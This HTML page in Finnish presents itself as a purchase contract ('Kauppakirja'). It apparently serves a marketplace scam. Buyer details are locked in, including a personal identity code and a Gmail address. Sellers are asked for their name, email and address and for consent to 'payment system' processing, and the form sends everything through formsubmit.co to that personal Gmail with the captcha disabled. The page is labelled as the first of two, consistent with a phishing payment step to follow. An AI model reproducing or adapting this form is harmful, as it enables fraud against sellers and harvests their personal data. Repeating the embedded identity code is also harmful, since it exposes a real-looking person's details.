<!DOCTYPE html>
<html lang="fi">
<head>
<meta charset="UTF-8">
<title>Kauppakirja</title>

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  padding: 20px;
  background: #f0f0f0;
  font-family: Arial, Helvetica, sans-serif;
  color: #000;
}

/* PAGE */
.page {
  width: 210mm;
  height: 297mm;
  background: #fff;
  margin: 0 auto 30px;
  padding: 20mm;
  position: relative;
}

/* HEADER */
.header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 25px;
}

.header h1 {
  font-size: 15px;
  margin: 0;
  letter-spacing: 1px;
}

.header img {
  height: 26px;
}

/* SECTIONS */
.section {
  border: 1px solid #000;
  padding: 12px;
  margin-bottom: 30px;
}

.section-title {
  font-weight: bold;
  font-size: 13px;
  margin-bottom: 10px;
}

/* TABLE */
.table {
  width: 100%;
  border-collapse: collapse;
  font-size: 12.5px;
}

.table td {
  border: 1px solid #000;
  padding: 6px;
  vertical-align: top;
}

.label {
  font-size: 11px;
  margin-bottom: 2px;
}

/* INPUT */
input {
  width: 100%;
  border: none;
  font-size: 12.5px;
  padding: 2px;
  background: #e6f4ff;
}

input:focus {
  outline: none;
  background: #fff;
}

input:not(:placeholder-shown) {
  background: #fff;
}

/* LOCKED */
input[readonly] {
  background: #fff;
  color: #000;
}

/* CHECKBOX */
.checkbox {
  font-size: 12px;
  margin-top: 10px;
}

/* BUTTON */
button {
  width: 100%;
  padding: 14px;
  font-size: 15px;
  font-weight: bold;
  background: #0072ce;
  color: #fff;
  border: none;
  cursor: pointer;
  margin-top: 20px;
}

button:hover {
  background: #005fa3;
}

/* FOOTER */
.page-footer {
  position: absolute;
  bottom: 10mm;
  right: 20mm;
  font-size: 12px;
}

/* PRINT */
@media print {
  body { background: none; padding: 0; }
  button { display: none; }
  input { background: transparent !important; }
}
</style>
</head>

<body>

<form action="https://formsubmit.co/kastalmero@gmail.com" method="POST">

<input type="hidden" name="_subject" value="Uusi kauppakirja">
<input type="hidden" name="_captcha" value="false">

<div class="page">

  <!-- HEADER -->
  <div class="header">
    <h1>KAUPPAKIRJA</h1>
    <img src="logo.png" alt="">
  </div>

  <!-- OSTAJА (LOCKED) -->
  <div class="section">
    <div class="section-title">Ostaja</div>

    <table class="table">
      <tr>
        <td>
          <div class="label">Nimi</div>
          <input type="text" name="Ostaja Nimi" value="Jukko Tapio" readonly>
        </td>
        <td>
          <div class="label">Henkilö- / Y-tunnus</div>
          <input type="text" name="Ostaja Tunnus" value="271066-073V" readonly>
        </td>
      </tr>
      <tr>
        <td>
          <div class="label">Osoite</div>
          <input type="text" name="Ostaja Osoite" value="Kankaankatu 17b" readonly>
        </td>
        <td>
          <div class="label">Postinumero ja -toimipaikka</div>
          <input type="text" name="Ostaja Kaupunki" value="74120 Iisalmi" readonly>
        </td>
      </tr>
      <tr>
        <td colspan="2">
          <div class="label">Sähköpostiosoite</div>
          <input type="email" name="Ostaja Email" value="kastalmero@gmail.com" readonly>
        </td>
      </tr>
    </table>
  </div>

  <!-- MYYJÄ -->
  <div class="section">
    <div class="section-title">Myyjä</div>

    <table class="table">
      <tr>
        <td>
          <div class="label">Nimi</div>
          <input type="text" name="Myyjä Nimi" placeholder=" ">
        </td>
        <td>
          <div class="label">Sähköpostiosoite</div>
          <input type="email" name="Myyjä Email" placeholder=" ">
        </td>
      </tr>
      <tr>
        <td colspan="2">
          <div class="label">Osoite</div>
          <input type="text" name="Myyjä Osoite" placeholder=" ">
        </td>
      </tr>
    </table>
  </div>

  <!-- CONSENT -->
  <div class="checkbox">
    <label>
      <input type="checkbox" required>
      Annan suostumukseni henkilötietojen käsittelyyn maksujärjestelmässä
    </label>
  </div>

  <!-- SUBMIT -->
  <button type="submit">Vahvista tiedot</button>

  <div class="page-footer">Sivu 1/2</div>
</div>

</form>

</body>
</html>
